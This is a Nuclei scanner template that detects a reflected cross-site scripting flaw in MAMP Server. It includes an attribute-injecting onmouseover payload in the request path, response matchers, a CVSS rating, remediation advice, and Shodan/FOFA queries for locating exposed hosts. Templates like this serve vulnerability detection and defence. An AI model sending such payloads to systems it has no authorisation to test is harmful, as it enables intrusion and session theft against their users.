id: mamp-server-xss

info:
  name: MAMP Server - 跨站脚本漏洞
  author: ritikchaddha
  severity: medium
  description: MAMP Server - 跨站脚本 存在跨站脚本漏洞。该模板通过构造恶意输入并检查响应回显或执行特征，验证目标是否会在浏览器上下文中执行注入脚本。
  impact: |
    - 攻击者可在受害者浏览器上下文中执行恶意脚本。
    - 可能导致 Cookie 窃取、会话劫持、页面篡改或钓鱼攻击。
  remediation: |
    - 对所有可控输入实施严格校验，并在输出到 HTML、JavaScript 或 URL 上下文前完成正确编码。
    - 如为后台或插件组件问题，建议同步更新到厂商已修复版本并审计相关功能入口。
  reference:
    - https://octagon.net/blog/2022/01/26/mamp-server-preauth-xss-leading-to-host-compromise-0day/
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N
    cvss-score: 5.3
    cwe-id: CWE-79,CWE-83
  metadata:
    verified: true
    max-request: 1
    shodan-query: title:"MAMP"
    fofa-query: title="MAMP"
  tags: mamp,server,xss,vuln

http:
  - method: GET
    path:
      - '{{BaseURL}}/index.php/test"%20onmouseover="alert(document.domain);"%20style="font-size:100000px;background-color:white";'

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - 'MAMP'
          - 'test" onmouseover="alert(document.domain);" style'
        condition: and

      - type: word
        part: content_type
        words:
          - 'text/html'

      - type: status
        status:
          - 200
